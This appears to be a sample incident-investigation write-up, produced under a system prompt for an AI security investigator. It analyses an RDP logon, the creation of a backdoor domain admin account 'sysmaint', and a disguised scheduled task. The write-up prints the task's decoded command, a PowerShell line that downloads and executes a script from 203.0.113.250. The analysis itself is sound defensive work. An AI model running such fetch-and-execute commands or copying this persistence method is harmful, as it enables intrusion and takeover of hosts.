system: You are a security investigator reviewing an alert. Base every claim only on the evidence available to you. Cite the record IDs that support each observation.

supporting_observations.claim: At 13:39:54 UTC, sam.okafor logged on to WS-LMARTINS-01 with LogonType 10 from 203.0.113.250; the same address appears in the inbound connection to port 3389. This conflicts with the supplied inventory stating remote administration is only from WS-SOKAFOR-01 and there is no VPN.
The logon received special privileges, including SeDebugPrivilege.
At 13:43:55 UTC, sam.okafor created the sysmaint account; one second later, sysmaint was added to the domain Administrators group.

At 13:43:57 UTC, a scheduled task named Microsoft\Windows\HealthCheck was created on WS-LMARTINS-01 under sam.okafor. It runs hidden PowerShell with an encoded command that decodes to `IEX (iwr http://203.0.113.250/a.ps1)`.

The unusual remote logon, creation of an administrator account, and task configured to retrieve and execute a script from the same IP form a strongly suspicious sequence. The evidence supports treating this as malicious activity, though it does not establish who controlled the remote address.

The records do not attribute 203.0.113.250 to a person or establish how the connection was made.
The supplied evidence does not show subsequent use of sysmaint or the full account and group-change history.
